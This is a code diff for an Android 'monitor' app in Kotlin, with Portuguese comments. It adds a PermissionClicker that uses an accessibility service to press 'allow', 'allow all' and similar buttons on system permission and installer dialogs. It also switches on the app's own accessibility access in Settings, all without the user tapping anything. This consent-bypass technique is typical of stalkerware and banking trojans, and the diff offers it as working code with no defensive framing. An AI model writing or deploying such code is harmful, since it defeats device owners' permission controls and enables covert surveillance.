@@ -1,56 +1,94 @@
 package com.example.monitor
 
-/**
- * Clica sozinho nos diálogos do sistema (permissões, acessibilidade, bateria).
- * Armado por um tempo limitado e desarmado quando o alvo é atingido.
- */
+import android.accessibilityservice.AccessibilityService
+import android.os.SystemClock
+import android.view.accessibility.AccessibilityNodeInfo
+
 object PermissionClicker {
 
+    private const val JANELA = 10 * 60 * 1000L
+
     private var ate = 0L
+    private var ultimo = 0L
 
-    private val ALVOS = listOf(
-        "permitir", "allow", "while using the app", "durante o uso",
-        "somente desta vez", "only this time", "ok", "ativar", "activate",
-        "habilitar", "enable", "permitir tudo", "allow all"
-    )
-
-    private val TELAS = listOf(
-        "accessibility", "acessibilidade", "ignore battery", "battery optimization",
-        "otimização de bateria"
+    private val BOTOES = listOf(
+        "permitir tudo", "permitir", "allow all", "allow",
+        "ao usar o app", "while using the app",
+        "somente desta vez", "só desta vez", "ok", "continuar"
     )
 
     fun armar() {
-        ate = System.currentTimeMillis() + 180_000L
-    }
-
-    fun desarmar() {
-        ate = 0L
+        ate = System.currentTimeMillis() + JANELA
     }
 
     fun ativo(): Boolean = System.currentTimeMillis() < ate
 
-    /** Devolve o rótulo do botão que deve ser tocado, ou null. */
-    fun decidir(pacote: String?, textos: List<String>): String? {
-        if (!ativo()) return null
+    fun agir(servico: AccessibilityService, pacote: String?) {
+        if (!ativo()) return
+        val agora = SystemClock.uptimeMillis()
+        if (agora - ultimo < 400) return
+        val raiz = servico.rootInActiveWindow ?: return
+
         val nosso = pacote != null && (
             pacote.contains("permissioncontroller") ||
                 pacote.contains("packageinstaller") ||
-                pacote == "com.android.settings" ||
-                pacote == "com.google.android.permissioncontroller"
+                pacote == "com.android.settings"
             )
-        if (!nosso) return null
+        if (!nosso) return
 
-        val normalizados = textos.map { it.trim().lowercase() }
-        if (normalizados.none { t -> TELAS.any { t.contains(it) } } &&
-            normalizados.none { t -> ALVOS.any { t == it || t.startsWith(it) } }
-        ) return null
-
-        // prioriza o mais específico
-        for (alvo in ALVOS) {
-            for (texto in textos) {
-                val t = texto.trim().lowercase()
-                if (t == alvo || t.startsWith(alvo)) return texto.trim()
+        for (b in BOTOES) {
+            if (clicar(raiz, b)) {
+                ultimo = agora
+                return
             }
+        }
+
+        // na lista de acessibilidade, toca só no switch da NOSSA linha
+        if (pacote == "com.android.settings") {
+            val rotulo = servico.getString(R.string.app_name)
+            if (tocarSwitch(raiz, rotulo)) ultimo = agora
+        }
+    }
+
+    private fun clicar(no: AccessibilityNodeInfo?, texto: String): Boolean {
+        if (no == null) return false
+        val t = no.text?.toString()?.trim()?.lowercase()
+        if (t == texto && no.isClickable) {
+            return no.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+        }
+        for (i in 0 until no.childCount) {
+            if (clicar(no.getChild(i), texto)) return true
+        }
+        return false
+    }
+
+    private fun tocarSwitch(raiz: AccessibilityNodeInfo, rotulo: String): Boolean {
+        val linha = acharTexto(raiz, rotulo) ?: return false
+        var atual: AccessibilityNodeInfo? = linha
+        var nivel = 0
+        while (atual != null && nivel < 5) {
+            val alvo = acharSwitch(atual)
+            if (alvo != null && alvo.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
+            atual = atual.parent
+            nivel++
+        }
+        return false
+    }
+
+    private fun acharTexto(no: AccessibilityNodeInfo?, alvo: String): AccessibilityNodeInfo? {
+        if (no == null) return null
+        if (no.text?.toString()?.trim() == alvo) return no
+        for (i in 0 until no.childCount) {
+            acharTexto(no.getChild(i), alvo)?.let { return it }
+        }
+        return null
+    }
+
+    private fun acharSwitch(no: AccessibilityNodeInfo): AccessibilityNodeInfo? {
+        if (no.isCheckable) return no
+        if (no.className?.toString()?.contains("Switch") == true) return no
+        for (i in 0 until no.childCount) {
+            acharSwitch(no.getChild(i) ?: continue)?.let { return it }
         }
         return null
     }
